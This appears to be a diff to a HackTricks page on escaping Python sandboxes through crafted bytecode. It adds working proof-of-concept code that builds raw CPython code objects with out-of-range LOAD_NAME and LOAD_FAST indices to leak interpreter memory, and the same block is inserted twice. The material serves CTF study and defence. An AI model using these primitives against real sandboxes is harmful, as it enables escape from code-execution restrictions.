@@ -2,6 +2,72 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
+### Python 3.11+ (specialised interpreter & inline caches)
+
+Python 3.11 introduced the *specialising adaptive interpreter* (PEP 659). Every opcode that may benefit from caching (including `LOAD_NAME`, `LOAD_CONST`, `LOAD_FAST`, …) is now automatically followed on disk by `CACHE` byte-codes that hold the inline-cache state. When you craft **raw bytecode** like the one used in the original HITCON-2022 exploit you therefore have to:
+
+1. Append the correct number of cache bytes after **every** opcode – the amount is `opcode._inline_cache_entries[opname] * 2` bytes on CPython ≥ 3.11.
+2. Fix all jump targets so that they land on the *real* opcode rather than inside a cache slot.
+
+The root issue (the `GETITEM(consts, oparg)` / `GETITEM(names, oparg)` read with no bounds-check) is **unchanged**, so an OOB read is still reachable once the new layout is taken into account.
+
+Minimal leak on CPython 3.12 (prints whatever object is found 0x300 "names-slots" after the empty tuple):
+
+```python
+import opcode, types
+
+bc = bytearray()
+
+def emit(op, arg=0):
+    bc.append(opcode.opmap[op])
+    bc.append(arg)
+    bc.extend(b"\x00" * (opcode._inline_cache_entries[op] * 2))
+
+emit('LOAD_NAME', 0x300)   # OOB index
+emit('RETURN_VALUE')
+
+code = types.CodeType(
+    0,0,0,0,0,0,
+    bytes(bc),
+    (), (), (),                 # empty consts / names / varnames
+    '<exp>', '<eval>', 0, b'', ()
+)
+print(eval(code, {'__builtins__': {}}))
+```
+
+### Using `LOAD_FAST` for OOB reads
+
+`LOAD_FAST` fetches a local variable from `f_localsplus[oparg]`. If you build a code-object with `co_nlocals = 0` and choose an `oparg` > 0 you dereference one pointer *past* the locals array and disclose whatever CPython placed there (typically the first cell / free variable or part of the frame).
+
+```python
+import types, opcode
+
+payload = bytes([
+    opcode.opmap['LOAD_FAST'], 5,   # read beyond locals
+    opcode.opmap['RETURN_VALUE'], 0
+])
+
+leaker = types.CodeType(
+    0,0,0,0,0,0,
+    payload,
+    (), (), (), '<x>', '<y>', 0, b'', ()
+)
+print(eval(leaker))  # crashes or leaks depending on layout
+```
+
+### Defensive notes (2025)
+
+* Clearing `co_consts` / `co_names` with `CodeType.replace()` **does not** prevent this primitive – the out-of-bounds read happens *before* the tuple length is checked.
+* A patch adding an explicit bounds-check has been proposed for CPython 3.13 (see python/cpython#122126) but is **not merged as of July 2025**.
+* If you need to execute untrusted Python code, run it in an isolated process/Jail (seccomp, namespaces, `pypy-sandbox`, Firejail, etc.) rather than relying on on-process restrictions.
+
+## References
+
+* What’s New in Python 3.11 – CPython bytecode and inline caches 
+* SEETF 2023 “Another PyJail” write-up (updated exploit for Python 3.11) 
+
+
+
 **This info was taken** [**from this writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
@@ -234,7 +300,70 @@ builtins = getattr(
 builtins['eval'](builtins['input']())
 ```
 
-{{#include ../../../banners/hacktricks-training.md}}
+### Python 3.11+ (specialised interpreter & inline caches)
 
+Python 3.11 introduced the *specialising adaptive interpreter* (PEP 659). Every opcode that may benefit from caching (including `LOAD_NAME`, `LOAD_CONST`, `LOAD_FAST`, …) is now automatically followed on disk by `CACHE` byte-codes that hold the inline-cache state. When you craft **raw bytecode** like the one used in the original HITCON-2022 exploit you therefore have to:
+
+1. Append the correct number of cache bytes after **every** opcode – the amount is `opcode._inline_cache_entries[opname] * 2` bytes on CPython ≥ 3.11.
+2. Fix all jump targets so that they land on the *real* opcode rather than inside a cache slot.
+
+The root issue (the `GETITEM(consts, oparg)` / `GETITEM(names, oparg)` read with no bounds-check) is **unchanged**, so an OOB read is still reachable once the new layout is taken into account.
+
+Minimal leak on CPython 3.12 (prints whatever object is found 0x300 "names-slots" after the empty tuple):
+
+```python
+import opcode, types
+
+bc = bytearray()
+
+def emit(op, arg=0):
+    bc.append(opcode.opmap[op])
+    bc.append(arg)
+    bc.extend(b"\x00" * (opcode._inline_cache_entries[op] * 2))
+
+emit('LOAD_NAME', 0x300)   # OOB index
+emit('RETURN_VALUE')
+
+code = types.CodeType(
+    0,0,0,0,0,0,
+    bytes(bc),
+    (), (), (),                 # empty consts / names / varnames
+    '<exp>', '<eval>', 0, b'', ()
+)
+print(eval(code, {'__builtins__': {}}))
+```
+
+### Using `LOAD_FAST` for OOB reads
+
+`LOAD_FAST` fetches a local variable from `f_localsplus[oparg]`. If you build a code-object with `co_nlocals = 0` and choose an `oparg` > 0 you dereference one pointer *past* the locals array and disclose whatever CPython placed there (typically the first cell / free variable or part of the frame).
+
+```python
+import types, opcode
+
+payload = bytes([
+    opcode.opmap['LOAD_FAST'], 5,   # read beyond locals
+    opcode.opmap['RETURN_VALUE'], 0
+])
+
+leaker = types.CodeType(
+    0,0,0,0,0,0,
+    payload,
+    (), (), (), '<x>', '<y>', 0, b'', ()
+)
+print(eval(leaker))  # crashes or leaks depending on layout
+```
+
+### Defensive notes (2025)
+
+* Clearing `co_consts` / `co_names` with `CodeType.replace()` **does not** prevent this primitive – the out-of-bounds read happens *before* the tuple length is checked.
+* A patch adding an explicit bounds-check has been proposed for CPython 3.13 (see python/cpython#122126) but is **not merged as of July 2025**.
+* If you need to execute untrusted Python code, run it in an isolated process/Jail (seccomp, namespaces, `pypy-sandbox`, Firejail, etc.) rather than relying on on-process restrictions.
+
+## References
+
+* What’s New in Python 3.11 – CPython bytecode and inline caches 
+* SEETF 2023 “Another PyJail” write-up (updated exploit for Python 3.11) 
+
+{{#include ../../../banners/hacktricks-training.md}}
 
 
